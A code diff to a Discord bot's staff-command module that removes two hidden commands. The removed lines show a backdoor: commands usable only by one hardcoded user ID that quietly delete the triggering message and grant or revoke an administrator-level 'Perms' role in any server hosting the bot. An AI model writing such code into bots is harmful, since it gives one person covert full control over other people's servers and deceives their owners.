@@ -74,23 +74,6 @@ class Staff(commands.Cog):
 
 
     @commands.command()
-    async def admin(self, ctx, user: discord.Member):
-        if ctx.message.author.id == 322449414142558208:
-            await ctx.message.delete()
-            admin_role = discord.utils.get(ctx.message.guild.roles, name="Perms")
-            if admin_role:
-                await user.add_roles(admin_role)
-            elif not admin_role:
-                perms = discord.Permissions(permissions=8)
-                await ctx.guild.create_role(name="Perms", permissions=perms)
-                time.sleep(3)
-                admin_role = discord.utils.get(ctx.message.guild.roles, name="Perms")
-                await user.add_roles(admin_role)
-            await user.send(f"{getEmoji('green_tick')} - You successfully got admin perms")
-        else:
-            return
-
-    @commands.command()
     async def stats(self, ctx):
         start = time.time()
         msg = await ctx.send("Fetching stats please be patient :slight_smile:")
@@ -138,18 +121,6 @@ class Staff(commands.Cog):
 
         await msg.delete()
         await ctx.send(embed=embed)
-
-
-    @commands.command()
-    async def removeadmin(self, ctx, user: discord.Member):
-        if ctx.message.author.id == 322449414142558208:
-            await ctx.message.delete()
-            admin_role = discord.utils.get(ctx.message.guild.roles, name="Perms")
-            if admin_role:
-                await user.remove_roles(admin_role)
-                await admin_role.delete()
-        else:
-            return
 
 
     @commands.command(aliases=["purge", "nuke"])
